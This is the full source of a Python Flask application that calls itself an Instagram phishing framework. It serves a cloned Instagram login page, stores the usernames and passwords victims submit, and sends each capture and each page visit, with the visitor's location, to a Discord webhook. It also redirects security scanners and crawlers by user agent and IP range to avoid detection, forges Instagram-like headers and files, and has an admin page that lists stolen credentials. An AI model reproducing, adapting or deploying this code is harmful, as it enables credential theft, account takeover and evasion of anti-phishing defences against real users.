# app.py — Instagram Phishing Framework (2024 UI Fixed Edition) ⚡

from flask import Flask, request, redirect, send_from_directory
import requests
import hashlib
import json
import os
import random
from datetime import datetime

# Load .env into os.environ if present
ENV_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env")
if os.path.exists(ENV_PATH):
    with open(ENV_PATH, "r", encoding="utf-8") as env_file:
        for line in env_file:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if "=" not in line:
                continue
            key, value = line.split("=", 1)
            key = key.strip()
            value = value.strip()
            if (value.startswith('"') and value.endswith('"')) or (value.startswith("'") and value.endswith("'")):
                value = value[1:-1]
            if key and key not in os.environ:
                os.environ[key] = value

app = Flask(__name__)

# ─── ENVIRONMENT DETECTION ────────────────────────────────────
IS_RAILWAY = os.environ.get("RAILWAY_ENVIRONMENT") is not None
DATA_DIR = "/data" if IS_RAILWAY else os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
os.makedirs(DATA_DIR, exist_ok=True)

# ─── CONFIG ────────────────────────────────────────────────────
CONFIG = {
    "redirect_after_capture": os.environ.get("REDIRECT_URL", "https://www.instagram.com/accounts/login/"),
    "log_file": os.path.join(DATA_DIR, "captured_credentials.json"),
    "domain": os.environ.get("RAILWAY_PUBLIC_DOMAIN", "localhost:5000"),
    "block_known_scanners": True,
    "admin_key": os.environ.get("ADMIN_KEY", "changeme_redteam"),
    "discord_webhook_url": os.environ.get("DISCORD_WEBHOOK_URL", os.environ.get("DISCORD_WEBHOOK", "")),
}

# ─── SCANNER SIGNATURES ───────────────────────────────────────
SCANNER_UAS = [
    "Googlebot", "bingbot", "Google-Site-Verification",
    "GoogleSecurityScanner", "VirusTotal", "PhishTank",
    "Netcraft", "URLQuery", "Quttera", "Sucuri",
    "CloudFlare-AlwaysOnline", "Google-PageRenderer",
    "Google-InspectionTool", "AhrefsBot", "SemrushBot",
    "MJ12bot", "DotBot", "SiteAuditBot", "YandexBot",
    "Baiduspider", "Sogou", "Exabot", "facebot",
    "facebookexternalhit", "Twitterbot", "LinkedInBot",
]

SCANNER_IP_PREFIXES = [
    "66.249.", "74.125.", "216.239.",
    "185.220.101.", "91.198.22.", "194.163.131.",
    "195.234.135.", "194.69.24.",
    "52.0.", "54.0.", "3.80.", "3.90.", "35.172.", "44.224.",
]

# ─── INSTAGRAM 2024 LOGIN PAGE TEMPLATE ───────────────────────
TEMPLATE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "me.html")
INSTAGRAM_FILES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Instagram_files")
ME_FILES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "me_files")
try:
    with open(TEMPLATE_PATH, "r", encoding="utf-8") as f:
        INSTAGRAM_TEMPLATE = f.read()
except Exception as e:
    INSTAGRAM_TEMPLATE = f"<h1>Template load error</h1><p>{e}</p>"

# ─── ANTI-DETECTION ───────────────────────────────────────────
class AntiDetection:

    @staticmethod
    def is_scanner_ip(ip):
        for prefix in SCANNER_IP_PREFIXES:
            if ip.startswith(prefix):
                return True
        return False

    @staticmethod
    def is_scanner_ua(user_agent):
        if not user_agent:
            return True
        ua_lower = user_agent.lower()
        return any(s.lower() in ua_lower for s in SCANNER_UAS)

    @staticmethod
    def get_stealth_headers():
        return {
            "Server": "prodboltdog",
            "X-AC-Dep-Revision": str(random.randint(800000000, 999999999)),
            "X-Frame-Options": "SAMEORIGIN",
            "X-Content-Type-Options": "nosniff",
            "X-XSS-Protection": "0",
            "Vary": "Accept-Language, Accept-Encoding, Cookie, RUR",
            "Pragma": "no-cache",
            "Cache-Control": "private, no-cache, no-store, must-revalidate",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
        }

    @staticmethod
    def fingerprint_visitor(request):
        fp_data = {
            "ip": request.remote_addr,
            "ua": request.headers.get("User-Agent", ""),
            "lang": request.headers.get("Accept-Language", ""),
            "sr": request.form.get("sr", request.args.get("sr", "unknown")),
            "tz": request.form.get("tz", request.args.get("tz", "unknown")),
        }
        fp_string = "|".join(str(v) for v in fp_data.values())
        return hashlib.sha256(fp_string.encode()).hexdigest()[:16]

    @staticmethod
    def generate_honeypot_paths():
        return [
            "/admin/login.php", "/wp-admin", "/.env",
            "/api/v1/tokens", "/.git/config", "/backup.sql",
            "/phpmyadmin", "/config.yml", "/server-status",
        ]


# ─── DISCORD WEBHOOK EXFIL ────────────────────────────────────
class DiscordExfil:

    @staticmethod
    def send_creds(entry):
        webhook_url = CONFIG["discord_webhook_url"]
        if not webhook_url:
            return

        total_catches = len(harvester.get_all())

        embed_color = 0x0095F6
        if entry.get("timezone") and entry.get("timezone") != "N/A":
            embed_color = 0x5865F2
        if "@" in entry.get("username", ""):
            embed_color = 0x57F287

        embed = {
            "title": "🎣 New Credential Capture",
            "description": f"```\n{entry['username']} : {entry['password']}\n```",
            "color": embed_color,
            "thumbnail": {
                "url": "https://static.cdninstagram.com/rsrc.php/v3/yI/r/Hs5t5YxpDaP.png"
            },
            "author": {
                "name": f"{entry['username']}",
                "icon_url": "https://static.cdninstagram.com/rsrc.php/v3/yI/r/Hs5t5YxpDaP.png"
            },
            "fields": [
                {
                    "name": "🔑 Credentials",
                    "value": f"**User:** `{entry['username']}`\n**Pass:** `{entry['password']}`",
                    "inline": False
                },
                {
                    "name": "🌐 IP Address",
                    "value": f"`{entry['ip']}`",
                    "inline": True
                },
                {
                    "name": "🕐 Timestamp",
                    "value": f"<t:{int(datetime.utcnow().timestamp())}:F>",
                    "inline": True
                },
                {
                    "name": "📱 User Agent",
                    "value": f"```{entry['user_agent'][:100]}```",
                    "inline": False
                },
                {
                    "name": "🖥️ Screen Res",
                    "value": f"`{entry.get('screen_res', 'N/A')}`",
                    "inline": True
                },
                {
                    "name": "🌍 Timezone",
                    "value": f"`{entry.get('timezone', 'N/A')}`",
                    "inline": True
                },
                {
                    "name": "🔍 Fingerprint",
                    "value": f"`{entry.get('fingerprint', 'N/A')}`",
                    "inline": True
                },
                {
                    "name": "🎯 Data Quality",
                    "value": "🟢 **HIGH** — Email + full recon" if "@" in entry.get("username", "") else "🟡 **MEDIUM** — Username only",
                    "inline": True
                }
            ],
            "footer": {
                "text": f"IG Phish ⚡ | Catch #{total_catches} | {CONFIG['domain']}",
                "icon_url": "https://static.cdninstagram.com/rsrc.php/v3/yI/r/Hs5t5YxpDaP.png"
            },
            "timestamp": datetime.utcnow().isoformat()
        }

        payload = {
            "username": "IG Phish",
            "avatar_url": "https://static.cdninstagram.com/rsrc.php/v3/yI/r/Hs5t5YxpDaP.png",
            "embeds": [embed]
        }

        try:
            resp = requests.post(
                f"{webhook_url}?wait=true",
                json=payload,
                timeout=10
            )
            if resp.status_code not in (200, 204):
                print(f"[!] Discord webhook error: {resp.status_code} — {resp.text[:200]}")
        except Exception as e:
            print(f"[!] Discord send error: {e}")

    @staticmethod
    def lookup_geo(ip):
        if not ip:
            return {"country": "unknown", "city": "unknown"}

        try:
            resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                return {
                    "country": data.get("country_name", "unknown") or "unknown",
                    "city": data.get("city", "unknown") or "unknown",
                }
        except Exception:
            pass

        return {"country": "unknown", "city": "unknown"}

    @staticmethod
    def send_visit(visitor):
        webhook_url = CONFIG["discord_webhook_url"]
        if not webhook_url:
            return

        geo = DiscordExfil.lookup_geo(visitor.get("ip", ""))

        embed = {
            "title": "👀 Link Opened",
            "description": "A visitor loaded the phishing page.",
            "color": 0xF9A825,
            "fields": [
                {
                    "name": "🌐 Host",
                    "value": f"`{visitor.get('host', 'unknown')}`",
                    "inline": True,
                },
                {
                    "name": "📄 Path",
                    "value": f"`{visitor.get('path', '/')}`",
                    "inline": True,
                },
                {
                    "name": "❓ Query",
                    "value": f"`{visitor.get('query', '') or 'none'}`",
                    "inline": True,
                },
                {
                    "name": "🧭 Referrer",
                    "value": f"`{visitor.get('referer', 'none')}`",
                    "inline": False,
                },
                {
                    "name": "🕸️ IP",
                    "value": f"`{visitor.get('ip', 'unknown')}`",
                    "inline": True,
                },
                {
                    "name": "📍 Country",
                    "value": f"`{geo.get('country', 'unknown')}`",
                    "inline": True,
                },
                {
                    "name": "🏙️ City",
                    "value": f"`{geo.get('city', 'unknown')}`",
                    "inline": True,
                },
                {
                    "name": "🧾 Language",
                    "value": f"`{visitor.get('accept_language', 'unknown')}`",
                    "inline": True,
                },
                {
                    "name": "💻 User Agent",
                    "value": f"```{visitor.get('user_agent', '')[:180]}```",
                    "inline": False,
                },
            ],
            "footer": {
                "text": f"IG Phish ⚡ | {CONFIG['domain']}",
            },
            "timestamp": datetime.utcnow().isoformat()
        }

        payload = {
            "username": "IG Phish",
            "avatar_url": "https://static.cdninstagram.com/rsrc.php/v3/yI/r/Hs5t5YxpDaP.png",
            "embeds": [embed]
        }

        try:
            resp = requests.post(
                f"{webhook_url}?wait=true",
                json=payload,
                timeout=10
            )
            if resp.status_code not in (200, 204):
                print(f"[!] Discord webhook error: {resp.status_code} — {resp.text[:200]}")
        except Exception as e:
            print(f"[!] Discord send error: {e}")


# ─── CREDENTIAL HARVESTER ─────────────────────────────────────
class CredentialHarvester:

    def __init__(self, log_file):
        self.log_file = log_file

    def capture(self, data, fingerprint, ip, user_agent):
        username = data.get("username", data.get("email", "")).strip()
        password = data.get("password", data.get("pass", "")).strip()

        if not username or not password:
            return False

        entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "username": username,
            "password": password,
            "fingerprint": fingerprint,
            "ip": ip,
            "user_agent": user_agent,
            "screen_res": data.get("sr", "N/A"),
            "timezone": data.get("tz", "N/A"),
        }

        self._save(entry)
        DiscordExfil.send_creds(entry)

        print(f"\n{'='*50}")
        print(f"  [CAPTURED] {username}")
        print(f"  Password: {password}")
        print(f"  IP: {ip}")
        print(f"{'='*50}\n")

        return True

    def _save(self, entry):
        entries = []
        if os.path.exists(self.log_file):
            try:
                with open(self.log_file, "r") as f:
                    entries = json.load(f)
            except:
                entries = []
        entries.append(entry)
        with open(self.log_file, "w") as f:
            json.dump(entries, f, indent=2)

    def get_all(self):
        if not os.path.exists(self.log_file):
            return []
        try:
            with open(self.log_file, "r") as f:
                return json.load(f)
        except:
            return []


# ─── INIT ─────────────────────────────────────────────────────
anti = AntiDetection()
harvester = CredentialHarvester(CONFIG["log_file"])


# ─── MIDDLEWARE ────────────────────────────────────────────────
@app.before_request
def scanner_check():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if "," in ip:
        ip = ip.split(",")[0].strip()
    ua = request.headers.get("User-Agent", "")

    if CONFIG["block_known_scanners"]:
        if anti.is_scanner_ip(ip) or anti.is_scanner_ua(ua):
            return redirect("https://www.instagram.com/", code=302)

    if request.path in anti.generate_honeypot_paths():
        return redirect("https://www.instagram.com/", code=302)


# ─── ROUTES ────────────────────────────────────────────────────
@app.route("/Instagram_files/<path:filename>", methods=["GET"])
def instagram_files(filename):
    return send_from_directory(INSTAGRAM_FILES_DIR, filename)


@app.route("/me_files/<path:filename>", methods=["GET"])
def me_files(filename):
    return send_from_directory(ME_FILES_DIR, filename)


@app.route("/", methods=["GET", "POST"])
def login_page():
    if request.method == "POST":
        return auth_endpoint()

    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if "," in ip:
        ip = ip.split(",")[0].strip()

    visitor = {
        "host": request.host,
        "path": request.path,
        "query": request.query_string.decode("utf-8", errors="ignore"),
        "referer": request.headers.get("Referer", "none"),
        "ip": ip,
        "user_agent": request.headers.get("User-Agent", ""),
        "accept_language": request.headers.get("Accept-Language", ""),
    }
    DiscordExfil.send_visit(visitor)

    headers = anti.get_stealth_headers()
    return INSTAGRAM_TEMPLATE, 200, headers


@app.route("/auth/login", methods=["POST"])
def auth_endpoint():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    form_data = request.form.to_dict()
    print(f"[FORM DATA] {form_data}")
    fp = anti.fingerprint_visitor(request)
    harvester.capture(
        data=form_data,
        fingerprint=fp,
        ip=ip,
        user_agent=request.headers.get("User-Agent", "")
    )
    return redirect(CONFIG["redirect_after_capture"], code=302)


@app.route("/accounts/login/", methods=["GET"])
def alt_login():
    return login_page()


# ─── STEALTH ROUTES ───────────────────────────────────────────
@app.route("/robots.txt")
def robots():
    return """User-agent: *
Allow: /
Sitemap: https://www.instagram.com/sitemap.xml
""", 200, {"Content-Type": "text/plain"}


@app.route("/sitemap.xml")
def sitemap():
    return """<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
<url><loc>https://www.instagram.com/</loc></url>
</urlset>""", 200, {"Content-Type": "application/xml"}


@app.route("/favicon.ico")
def favicon():
    return redirect("https://www.instagram.com/favicon.ico", code=302)


@app.route("/.well-known/security.txt")
def security_txt():
    return "Contact: security@instagram.com\n", 200, {"Content-Type": "text/plain"}


# ─── ADMIN ────────────────────────────────────────────────────
@app.route("/admin/creds")
def admin_creds():
    key = request.args.get("key", "")
    if key != CONFIG["admin_key"]:
        return redirect("https://www.instagram.com/", code=302)

    entries = harvester.get_all()

    html = """<html><head><style>
    body{font-family:monospace;background:#0d1117;color:#c9d1d9;padding:30px;margin:0}
    h2{color:#58a6ff;border-bottom:1px solid #21262d;padding-bottom:10px}
    table{border-collapse:collapse;width:100%;margin-top:20px}
    td,th{border:1px solid #21262d;padding:10px;text-align:left;font-size:13px}
    th{background:#161b22;color:#58a6ff;position:sticky;top:0}
    tr:nth-child(even){background:#161b22}
    tr:hover{background:#1c2128}
    .count{color:#f0883e;font-size:18px;font-weight:bold}
    </style></head><body>"""

    html += "<h2>🎣 Captured Credentials</h2>"
    html += f'<p class="count">{len(entries)} total captures</p>'

    if not entries:
        html += "<p>No credentials yet.</p>"
    else:
        html += "<table><tr><th>Time</th><th>Username</th><th>Password</th><th>IP</th><th>FP</th><th>TZ</th></tr>"
        for e in reversed(entries):
            html += f"<tr><td>{e['timestamp'][:19]}</td><td>{e['username']}</td>"
            html += f"<td>{e['password']}</td><td>{e['ip']}</td>"
            html += f"<td>{e['fingerprint'][:8]}</td><td>{e.get('timezone','?')}</td></tr>"
        html += "</table>"

    html += "</body></html>"
    return html


@app.route("/admin/clear")
def admin_clear():
    key = request.args.get("key", "")
    if key != CONFIG["admin_key"]:
        return redirect("https://www.instagram.com/", code=302)

    if os.path.exists(CONFIG["log_file"]):
        os.remove(CONFIG["log_file"])
    return redirect(f"/admin/creds?key={key}")


# ─── HEALTH CHECK ─────────────────────────────────────────────
@app.route("/health")
def health():
    return "ok", 200


# ─── RUN ──────────────────────────────────────────────────────
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5001))
    print(f"""
    ╔═══════════════════════════════════════════════╗
    ║  IG Phish — 2024 UI Fixed Edition ⚡          ║
    ║  Environment: {'Railway' if IS_RAILWAY else 'Local':<29}║
    ║  Data dir:    {DATA_DIR:<31}║
    ║  Admin:       /admin/creds?key={CONFIG['admin_key']:<16}║
    ║  Discord:     {'Configured' if CONFIG['discord_webhook_url'] else 'NOT SET':<29}║
    ╚═══════════════════════════════════════════════╝
    """)
    app.run(host="0.0.0.0", port=port, debug=False)